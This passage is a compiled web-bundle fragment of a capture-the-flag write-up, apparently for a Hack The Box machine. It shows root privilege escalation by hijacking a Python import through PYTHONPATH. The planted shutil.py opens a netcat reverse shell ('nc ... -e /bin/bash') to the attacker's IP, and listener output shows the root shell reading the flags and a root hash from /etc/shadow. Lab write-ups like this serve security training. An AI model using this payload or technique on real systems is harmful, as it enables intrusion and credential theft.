",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/scripts/backup.py"),", let's see that:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/python3\n\nfrom shutil import make_archive\n\nsrc = '/var/www/html/'\n\n# old ftp directory, not used anymore\n#dst = '/srv/ftp/html'\n\ndst = '/var/backups/html'\n\nmake_archive(dst, 'gztar', src)\n")),(0,r.kt)("p",null,"It looks like we'll have to mess with the python import system."),(0,r.kt)("p",null,"I won't explain to much here, if you want to understand the attack please read\n",(0,r.kt)("a",{parentName:"p",href:"https://rawsec.ml/en/sigseg-2018-quals-write-ups/#100-Fun-avec-python-App-Script"},"SIGSEGv1 Quals 2018 - Write-ups - 100 - Fun avec python - App-Script"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ mkdir -p /tmp/cyfun/\n$ cd /tmp/cyfun/\n$ vim.tiny shutil.py\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"shutil.py")," (a reverse-shell because spawning a PTY is useless as the python script is sent to background)"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'def make_archive(no,ra,j):\n    import os\n    os.system("nc 10.10.15.31 8888 -e /bin/bash")\n')),(0,r.kt)("p",null,"Start a ",(0,r.kt)("a",{parentName:"p",href:"https://pwncat.org/"},"pwncat")," listener: ",(0,r.kt)("inlineCode",{parentName:"p"},"pwncat -l 8888 -vv"),"."),(0,r.kt)("p",null,"Then let's call the script:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo PYTHONPATH=/tmp/cyfun/ /opt/scripts/admin_tasks.sh\n\n[[[ System Administration Menu ]]]\n1) View system uptime\n2) View logged in users\n3) View crontab\n4) Backup passwd file\n5) Backup shadow file\n6) Backup web data\n7) Backup DB\n8) Quit\nChoose an option: 6\nRunning backup script in the background, it might take a while...\n")),(0,r.kt)("p",null,"On our listener:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 8888 -vv\nINFO: Listening on :::8888 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.187:33374 (family 2/IPv4, TCP)\nid\nuid=0(root) gid=0(root) groups=0(root)\npwd\n/tmp/cyfun\ncd /root\ncat root.txt\n9e96b615438b09b210be126a5e7d0577\ncat /home/waldo/user.txt\n30a8ad9cb41261bf0f97f75094358045\ncat /etc/shadow | grep root\nroot:$6$M5g.E5/j$AO7lZNZXLFABZld5uGh/YB3J1Va4AG9Tmw1icvm2MsDOj6B1RFloUmnA9jcj4DIsILOedBvVQg66CVjGrd.fl0:18374:0:99999:7:::\n")))}d.isMDXComponent=!0},76720:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/admirer-43675575b54da8d4e5eb91067cc329c1.png"}}]);